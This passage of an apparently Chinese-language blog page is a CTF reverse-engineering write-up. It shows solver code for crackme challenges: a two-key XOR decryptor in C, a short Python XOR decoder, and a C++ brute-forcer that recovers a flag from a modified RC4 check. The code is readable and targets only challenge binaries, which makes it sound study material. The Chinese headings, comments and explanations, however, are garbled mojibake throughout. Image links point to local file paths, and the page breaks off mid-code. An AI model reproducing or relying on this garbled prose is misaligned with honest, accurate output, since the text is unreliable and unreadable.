href="#èµ°å¼¯è·¯åšæ³•ï¼šåˆ†æåŠ å¯†åŸç†ï¼Œæ‰¾é™æ€èµ„æº" class="headerlink" title="èµ°å¼¯è·¯åšæ³•ï¼šåˆ†æåŠ å¯†åŸç†ï¼Œæ‰¾é™æ€èµ„æº"></a>èµ°å¼¯è·¯åšæ³•ï¼šåˆ†æåŠ å¯†åŸç†ï¼Œæ‰¾é™æ€èµ„æº</h4><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240206224417017.png" alt="image-20240206224417017"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> dec3[<span class="number">33</span>];</span><br><span class="line"> </span><br><span class="line"><span class="type">char</span> dec4[] = <span class="string">&quot;`agh&#123;^bvuwTooahlYocPtmyiijj|ek&#x27;p&quot;</span>;</span><br><span class="line"><span class="type">char</span> key1[] = <span class="string">&quot;63290794207715587679621386735000&quot;</span>;</span><br><span class="line"><span class="type">char</span> key2[] = <span class="string">&quot;41803873625901363092606632787947&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">dec</span><span class="params">(<span class="type">char</span> *output,<span class="type">char</span> *key)</span> &#123;</span><br><span class="line">    <span class="type">char</span> dec1[<span class="number">33</span>];</span><br><span class="line">    <span class="type">char</span> dec2[<span class="number">33</span>];</span><br><span class="line">    <span class="type">char</span> key1[<span class="number">33</span>];</span><br><span class="line">    <span class="type">char</span> key2[<span class="number">33</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;</span><br><span class="line">        key1[i] = key[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;</span><br><span class="line">        key2[i] = key[i + <span class="number">16</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;  </span><br><span class="line">        dec1[i] = output[i + <span class="number">16</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;  </span><br><span class="line">        dec2[i] = output[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123; </span><br><span class="line">        dec1[i] ^= key1[<span class="number">16</span> - i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123; </span><br><span class="line">        dec2[i] ^= key2[<span class="number">16</span> - i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;</span><br><span class="line">        dec1[i] ^= key2[<span class="number">16</span> - i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123; </span><br><span class="line">        dec2[i] ^= key1[<span class="number">16</span> - i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123; </span><br><span class="line">        dec1[i] ^= key1[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;  </span><br><span class="line">        dec2[i] ^= key2[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123; </span><br><span class="line">        dec1[i] ^= key2[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123; </span><br><span class="line">        dec2[i] ^= key1[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;</span><br><span class="line">        dec3[i] = dec1[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;</span><br><span class="line">        dec3[i + <span class="number">16</span>] = dec2[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    dec(dec4,key2);</span><br><span class="line">    dec(dec3,key1);</span><br><span class="line">    <span class="built_in">printf</span>(dec3);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ç®€å•ç²—æš´æ³•ï¼šå¼‚æˆ–æ˜¯å¯é€†çš„"><a href="#ç®€å•ç²—æš´æ³•ï¼šå¼‚æˆ–æ˜¯å¯é€†çš„" class="headerlink" title="ç®€å•ç²—æš´æ³•ï¼šå¼‚æˆ–æ˜¯å¯é€†çš„"></a>ç®€å•ç²—æš´æ³•ï¼šå¼‚æˆ–æ˜¯å¯é€†çš„</h4><p>ä½†æ˜¯å¾—è€ƒè™‘åè°ƒè¯•ï¼Œè¦ä¸ç„¶å‡ºä¸æ¥ï¼Œ</p><h3 id="superguesserï¼ˆåŠ¨æ€è°ƒè¯•"><a href="#superguesserï¼ˆåŠ¨æ€è°ƒè¯•" class="headerlink" title="superguesserï¼ˆåŠ¨æ€è°ƒè¯•"></a><strong>superguesser</strong>ï¼ˆåŠ¨æ€è°ƒè¯•</h3><h4 id="a-é™æ€çŒœæµ‹ï¼ç‰›"><a href="#a-é™æ€çŒœæµ‹ï¼ç‰›" class="headerlink" title="a?é™æ€çŒœæµ‹ï¼ç‰›"></a>a?é™æ€çŒœæµ‹ï¼ç‰›</h4><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240206235813820.png" alt="image-20240206235813820"></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">data = <span class="built_in">bytearray</span>.fromhex(<span class="string">&quot;5151525f59435d5f59495a59562e261d2a371a27291728242a3825213d0f323a3c3d36332a&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">37</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(data[i] ^ (i + <span class="number">51</span>)), end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="ä¿„è¯­å­¦ä¹ "><a href="#ä¿„è¯­å­¦ä¹ " class="headerlink" title="ä¿„è¯­å­¦ä¹ "></a>ä¿„è¯­å­¦ä¹ </h3><p>IDAåå‘ç°ç­”æ¡ˆéƒ½æ˜¯æ˜æ–‡ï¼Œï¼ˆä½†æ˜¯å¥½å¤šé¢˜</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240207224620727.png" alt="image-20240207224620727"></p><p>æœ€åçš„æ±‚flagæ‰æ˜¯æ­£èœ</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240207222416136.png" alt="image-20240207222416136"></p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240207231022742.png" alt="image-20240207231022742"></p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240207231040398.png" alt="image-20240207231040398"></p><p>flagè¾“å…¥åï¼Œå†…å®¹æ˜¯è¦å»func2ä¸­çš„tmpStrï¼ˆæ˜æ–‡ï¼‰æ¯”è¾ƒçš„ï¼Œæ‰€ä»¥éœ€è¦è¿è¡Œå¹¶æå–tmpStråŠ å¯†å‰åçš„å†…å®¹ï¼Œè¿˜æœ‰ä¸¤ä¸ªç›’å­ä»¥åŠStr2_0</p><p>ä¸»è¦åŠ å¯†æ˜¯rc4ï¼Œè€Œä¸”strçš„åŠ å¯†ç»“æœå’ŒtmpStrçš„åŠ å¯†ç»“æœæ˜¯ç›¸åŒçš„ï¼Œé—´æ¥çš„ç»™å‡ºäº†strçš„ç»“æœ</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240208010234042.png" alt="image-20240208010234042"></p><h4 id="çˆ†ç ´rc4"><a href="#çˆ†ç ´rc4" class="headerlink" title="çˆ†ç ´rc4"></a>çˆ†ç ´rc4</h4><p>#ç¡¬å†™ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> box3[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> box4[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç¬¬ä¸€ä¸ªç›’å­ box</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> box[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x35</span>, <span class="number">0xF1</span>, <span class="number">0xDA</span>, <span class="number">0x19</span>, <span class="number">0x7A</span>, <span class="number">0xF6</span>, <span class="number">0x31</span>, <span class="number">0x9C</span>, <span class="number">0xD9</span>, <span class="number">0x2C</span>,</span><br><span class="line">  <span class="number">0xC1</span>, <span class="number">0xFC</span>, <span class="number">0xE2</span>, <span class="number">0xD8</span>, <span class="number">0x1D</span>, <span class="number">0x8D</span>, <span class="number">0x4F</span>, <span class="number">0x97</span>, <span class="number">0x81</span>, <span class="number">0x26</span>,</span><br><span class="line">  <span class="number">0xC0</span>, <span class="number">0xB8</span>, <span class="number">0x96</span>, <span class="number">0x27</span>, <span class="number">0xD5</span>, <span class="number">0x5B</span>, <span class="number">0xAA</span>, <span class="number">0x18</span>, <span class="number">0x85</span>, <span class="number">0xFA</span>,</span><br><span class="line">  <span class="number">0x61</span>, <span class="number">0xE4</span>, <span class="number">0xA1</span>, <span class="number">0xBC</span>, <span class="number">0xF8</span>, <span class="number">0xA4</span>, <span class="number">0x56</span>, <span class="number">0x37</span>, <span class="number">0x43</span>, <span class="number">0x58</span>,</span><br><span class="line">  <span class="number">0x2B</span>, <span class="number">0xC9</span>, <span class="number">0x77</span>, <span class="number">0x64</span>, <span class="number">0xCC</span>, <span class="number">0x6B</span>, <span class="number">0x98</span>, <span class="number">0x65</span>, <span class="number">0x75</span>, <span class="number">0x38</span>,</span><br><span class="line">  <span class="number">0x80</span>, <span class="number">0x09</span>, <span class="number">0x11</span>, <span class="number">0x3D</span>, <span class="number">0xD0</span>, <span class="number">0xE6</span>, <span class="number">0x8F</span>, <span class="number">0xA9</span>, <span class="number">0x57</span>, <span class="number">0x99</span>,</span><br><span class="line">  <span class="number">0x06</span>, <span class="number">0x10</span>, <span class="number">0x5D</span>, <span class="number">0xC5</span>, <span class="number">0x69</span>, <span class="number">0xBD</span>, <span class="number">0x2D</span>, <span class="number">0x68</span>, <span class="number">0x7E</span>, <span class="number">0xE3</span>,</span><br><span class="line">  <span class="number">0x67</span>, <span class="number">0xD1</span>, <span class="number">0xFF</span>, <span class="number">0x5E</span>, <span class="number">0xF9</span>, <span class="number">0xF5</span>, <span class="number">0x41</span>, <span class="number">0x8C</span>, <span class="number">0xDD</span>, <span class="number">0x21</span>,</span><br><span class="line">  <span class="number">0x4B</span>, <span class="number">0xA7</span>, <span class="number">0x47</span>, <span class="number">0x86</span>, <span class="number">0x6D</span>, <span class="number">0xC3</span>, <span class="number">0x2A</span>, <span class="number">0x9A</span>, <span class="number">0x9F</span>, <span class="number">0x20</span>,</span><br><span class="line">  <span class="number">0x48</span>, <span class="number">0xBB</span>, <span class="number">0x94</span>, <span class="number">0xB9</span>, <span class="number">0xB4</span>, <span class="number">0x92</span>, <span class="number">0x02</span>, <span class="number">0x74</span>, <span class="number">0x7D</span>, <span class="number">0x1B</span>,</span><br><span class="line">  <span class="number">0x1E</span>, <span class="number">0x5F</span>, <span class="number">0xBA</span>, <span class="number">0x49</span>, <span class="number">0xD6</span>, <span class="number">0xE7</span>, <span class="number">0x53</span>, <span class="number">0x04</span>, <span class="number">0xCB</span>, <span class="number">0x28</span>,</span><br><span class="line">  <span class="number">0x3F</span>, <span class="number">0xE8</span>, <span class="number">0x33</span>, <span class="number">0x3E</span>, <span class="number">0x00</span>, <span class="number">0x9B</span>, <span class="number">0x6A</span>, <span class="number">0xFD</span>, <span class="number">0xBE</span>, <span class="number">0x1C</span>,</span><br><span class="line">  <span class="number">0x90</span>, <span class="number">0xED</span>, <span class="number">0xDF</span>, <span class="number">0x4D</span>, <span class="number">0x25</span>, <span class="number">0x6F</span>, <span class="number">0xB5</span>, <span class="number">0x13</span>, <span class="number">0x70</span>, <span class="number">0x3C</span>,</span><br><span class="line">  <span class="number">0x9E</span>, <span class="number">0x16</span>, <span class="number">0x0C</span>, <span class="number">0x05</span>, <span class="number">0x4A</span>, <span class="number">0x73</span>, <span class="number">0xDE</span>, <span class="number">0xB1</span>, <span class="number">0x8A</span>, <span class="number">0x51</span>,</span><br><span class="line">  <span class="number">0x3B</span>, <span class="number">0x54</span>, <span class="number">0x14</span>, <span class="number">0xE0</span>, <span class="number">0x5A</span>, <span class="number">0xDC</span>, <span class="number">0x91</span>, <span class="number">0x62</span>, <span class="number">0xA3</span>, <span class="number">0x95</span>,</span><br><span class="line">  <span class="number">0xD3</span>, <span class="number">0x3A</span>, <span class="number">0x17</span>, <span class="number">0xEE</span>, <span class="number">0x32</span>, <span class="number">0xF2</span>, <span class="number">0x7C</span>, <span class="number">0xAF</span>, <span class="number">0xB3</span>, <span class="number">0x88</span>,</span><br><span class="line">  <span class="number">0xEC</span>, <span class="number">0x0E</span>, <span class="number">0xAE</span>, <span class="number">0x9D</span>, <span class="number">0x5C</span>, <span class="number">0x0D</span>, <span class="number">0x55</span>, <span class="number">0x4E</span>, <span class="number">0xFB</span>, <span class="number">0x46</span>,</span><br><span class="line">  <span class="number">0x22</span>, <span class="number">0x44</span>, <span class="number">0x45</span>, <span class="number">0xBF</span>, <span class="number">0x52</span>, <span class="number">0x12</span>, <span class="number">0x66</span>, <span class="number">0x07</span>, <span class="number">0xD2</span>, <span class="number">0x36</span>,</span><br><span class="line">  <span class="number">0x93</span>, <span class="number">0x6E</span>, <span class="number">0x42</span>, <span class="number">0x1A</span>, <span class="number">0x0F</span>, <span class="number">0xE9</span>, <span class="number">0x60</span>, <span class="number">0xCA</span>, <span class="number">0xB2</span>, <span class="number">0x6C</span>,</span><br><span class="line">  <span class="number">0x83</span>, <span class="number">0xF0</span>, <span class="number">0x03</span>, <span class="number">0x76</span>, <span class="number">0xA8</span>, <span class="number">0x1F</span>, <span class="number">0x63</span>, <span class="number">0xEF</span>, <span class="number">0xA5</span>, <span class="number">0xCD</span>,</span><br><span class="line">  <span class="number">0x79</span>, <span class="number">0x7B</span>, <span class="number">0x0A</span>, <span class="number">0x0B</span>, <span class="number">0xAB</span>, <span class="number">0xDB</span>, <span class="number">0xD4</span>, <span class="number">0x7F</span>, <span class="number">0x01</span>, <span class="number">0x34</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x59</span>, <span class="number">0xE1</span>, <span class="number">0x29</span>, <span class="number">0xC6</span>, <span class="number">0xAC</span>, <span class="number">0xA2</span>, <span class="number">0x40</span>, <span class="number">0xC8</span>, <span class="number">0xAD</span>,</span><br><span class="line">  <span class="number">0xC4</span>, <span class="number">0x89</span>, <span class="number">0xC2</span>, <span class="number">0xB6</span>, <span class="number">0x71</span>, <span class="number">0xA0</span>, <span class="number">0xEB</span>, <span class="number">0x2F</span>, <span class="number">0x78</span>, <span class="number">0xF3</span>,</span><br><span class="line">  <span class="number">0xB0</span>, <span class="number">0xFE</span>, <span class="number">0xCE</span>, <span class="number">0xF7</span>, <span class="number">0x84</span>, <span class="number">0x72</span>, <span class="number">0xF4</span>, <span class="number">0xCF</span>, <span class="number">0xC7</span>, <span class="number">0xD7</span>,</span><br><span class="line">  <span class="number">0xB7</span>, <span class="number">0x8E</span>, <span class="number">0x4C</span>, <span class="number">0x82</span>, <span class="number">0x30</span>, <span class="number">0x50</span>, <span class="number">0x2E</span>, <span class="number">0x24</span>, <span class="number">0x87</span>, <span class="number">0x08</span>,</span><br><span class="line">  <span class="number">0x39</span>, <span class="number">0xE5</span>, <span class="number">0xEA</span>, <span class="number">0xA6</span>, <span class="number">0x8B</span>, <span class="number">0x15</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¯¹è¾“å…¥è¿›è¡Œå¤„ç†çš„å­—ç¬¦ä¸² Str2_0</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> Str2_0[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x35</span>, <span class="number">0x6D</span>, <span class="number">0x35</span>, <span class="number">0x64</span>, <span class="number">0x35</span>, <span class="number">0x77</span>, <span class="number">0x35</span>, <span class="number">0x64</span>, <span class="number">0x35</span>, <span class="number">0x62</span>,</span><br><span class="line">  <span class="number">0x35</span>, <span class="number">0x6E</span>, <span class="number">0x35</span>, <span class="number">0x6D</span>, <span class="number">0x35</span>, <span class="number">0x64</span>, <span class="number">0x35</span>, <span class="number">0x77</span>, <span class="number">0x35</span>, <span class="number">0x64</span>,</span><br><span class="line">  <span class="number">0x35</span>, <span class="number">0x62</span>, <span class="number">0x35</span>, <span class="number">0x6E</span>, <span class="number">0x35</span>, <span class="number">0x6D</span>, <span class="number">0x35</span>, <span class="number">0x64</span>, <span class="number">0x35</span>, <span class="number">0x77</span>,</span><br><span class="line">  <span class="number">0x35</span>, <span class="number">0x64</span>, <span class="number">0x35</span>, <span class="number">0x62</span>, <span class="number">0x35</span>, <span class="number">0x6E</span>, <span class="number">0x8E</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¤„ç†åçš„ tmpStr</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> tmpStr[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x38</span>, <span class="number">0x9A</span>, <span class="number">0xFA</span>, <span class="number">0xC3</span>, <span class="number">0x5B</span>, <span class="number">0x89</span>, <span class="number">0xA5</span>, <span class="number">0xE6</span>, <span class="number">0xD0</span>, <span class="number">0xAB</span>,</span><br><span class="line">  <span class="number">0x42</span>, <span class="number">0x58</span>, <span class="number">0x57</span>, <span class="number">0x09</span>, <span class="number">0x42</span>, <span class="number">0xAB</span>, <span class="number">0x33</span>, <span class="number">0x2F</span>, <span class="number">0x98</span>, <span class="number">0x42</span>,</span><br><span class="line">  <span class="number">0x2E</span>, <span class="number">0x59</span>, <span class="number">0x6D</span>, <span class="number">0x41</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¤„ç†å‰çš„ tmpStr</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> tmpstr[] = <span class="string">&quot;+i&amp;[@Y:g8[&amp;l$f8S8v$Y&amp;e&gt;&#123;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åŠ å¯†å‡½æ•°</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">rc4_crypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* box, <span class="type">unsigned</span> <span class="type">char</span>* data, <span class="type">unsigned</span> <span class="type">long</span> datalen)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, t = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> k = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; datalen; k++)</span><br><span class="line">    &#123;</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span>;</span><br><span class="line">        tmp = box[i];</span><br><span class="line">        box[i] = box[j];</span><br><span class="line">        box[j] = tmp;</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span>;</span><br><span class="line">        data[k] ^= box[t];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> flag[<span class="number">30</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// å…ˆå¤‡ä»½ä¸€ä»½ box</span></span><br><span class="line">    <span class="built_in">memcpy</span>(box3,box,<span class="number">256</span>);</span><br><span class="line">    <span class="type">int</span> k = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> v1, v2, v3;</span><br><span class="line">    <span class="type">int</span> v11, v21, v31;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        v1 = v2 = v3 = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">memcpy</span>(box3, box, <span class="number">256</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>((<span class="type">char</span>*)tmpStr); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (flag[i] != <span class="number">0</span>)                           <span class="comment">// å…ˆæ ¹æ®flagçš„å†…å®¹æ¥</span></span><br><span class="line">            &#123;</span><br><span class="line">                v1 = (v1 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">                v2 = (v2 + box3[v1]) % <span class="number">256</span>;</span><br><span class="line">                tmp = box3[v1];</span><br><span class="line">                box3[v1] = box3[v2];</span><br><span class="line">                box3[v2] = tmp;</span><br><span class="line">                v3 = (box3[v1] + box3[v2]) % <span class="number">256</span>;</span><br><span class="line">                <span class="comment">//tmpstr[i] ^= box3[v3];</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>                                        <span class="comment">// çˆ†ç ´</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//å…ˆä¿å­˜ä¸Šä¸€æ¬¡æ­£ç¡®çš„ v1ã€v2ã€v3</span></span><br><span class="line">                v11 = v1;</span><br><span class="line">                v21 = v2;</span><br><span class="line">                v31 = v3;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">char</span> j = <span class="number">32</span>; j &lt; <span class="number">127</span>; j++)</span><br><span class="line">                &#123;</span><br><span class="line">                    k = j + Str2_0[i] - <span class="number">112</span>;</span><br><span class="line">                    <span class="built_in">memcpy</span>(box4, box3, <span class="number">256</span>);</span><br><span class="line">                    v1 = v11;</span><br><span class="line">                    v2 = v21;</span><br><span class="line">                    v3 = v31;</span><br><span class="line"></span><br><span class="line">                    v1 = (v1 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">                    v2 = (v2 + box4[v1]) % <span class="number">256</span>;</span><br><span class="line">                    tmp = box4[v1];</span><br><span class="line">                    box4[v1] = box4[v2];</span><br><span class="line">                    box4[v2] = tmp;</span><br><span class="line">                    v3 = (box4[v1] + box4[v2]) % <span class="number">256</span>;</span><br><span class="line">                    k ^= box4[v3];</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (k == tmpStr[i])</span><br><span class="line">                    &#123;</span><br><span class="line">                        flag[i] = j;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strlen</span>((<span class="type">char</span>*)flag) == <span class="built_in">strlen</span>((<span class="type">char</span>*)tmpStr))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; flag &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    func();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span 